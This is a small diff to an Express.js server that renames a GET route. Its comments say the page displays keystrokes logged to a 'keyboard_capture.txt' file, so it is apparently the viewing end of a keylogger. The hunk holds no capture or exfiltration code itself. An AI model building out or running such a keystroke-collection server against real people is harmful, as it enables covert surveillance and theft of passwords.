@@ -15,7 +15,7 @@ app.use(bodyParser.json({extended: true}));
 const port = 8080;
 
 // When a GET request is made to the "/" resource we return basic HTML.
-app.get("/index", (req, res) => {
+app.get("/", (req, res) => {
     /* The GET request shows the data that's logged in the keyboard_capture.txt file.
     If the file keyboard_capture.txt has not yet been created, the try catch statement will
     throw an exception and log to the homepage that nothing's been logged yet.   
